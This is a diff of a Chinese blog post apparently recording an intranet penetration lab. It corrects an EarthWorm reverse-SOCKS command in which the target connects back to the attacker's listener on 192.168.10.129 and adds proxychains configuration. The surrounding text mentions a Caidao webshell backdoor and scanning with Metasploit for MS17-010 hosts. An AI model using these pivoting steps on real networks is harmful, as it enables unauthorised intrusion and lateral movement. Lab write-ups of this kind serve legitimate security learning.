@@ -401,9 +401,13 @@ run</code></pre><p>&emsp;在菜刀终端中执行后门</p>
 <p>&emsp;那么就先试试做代理吧</p>
 <p>&emsp;kali先开启监听</p>
 <pre><code>./ew_for_linux -s rcsocks -e 8888 -l 1080</code></pre><p>&emsp;在靶机上</p>
-<pre><code>ew.exe -s rssocks -d 192.168.10.129 -e 88</code></pre><p>&emsp;成功连接</p>
+<pre><code>ew.exe -s rssocks -d 192.168.10.129 -e 8888</code></pre><p>&emsp;成功连接</p>
 <p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(2).png" alt></p>
 <p>&emsp;接下来就得使用代理工具proxychains了</p>
+<p>&emsp;用vim编辑/etc/proxychains.conf</p>
+<pre><code>在最后一行加入
+socks5 127.0.0.1 1080
+注释掉其他的代理地址</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/1.png" alt></p>
 <p>&emsp;需要使用代理在命令前加proxychains<br>&emsp;例如：proxychains msfconsole<br>&emsp;使用代理之后我们就可以访问内网了</p>
 <p>搜索内网中能使用ms17-010漏洞的主机</p>
 <pre><code>proxychains msfconsole
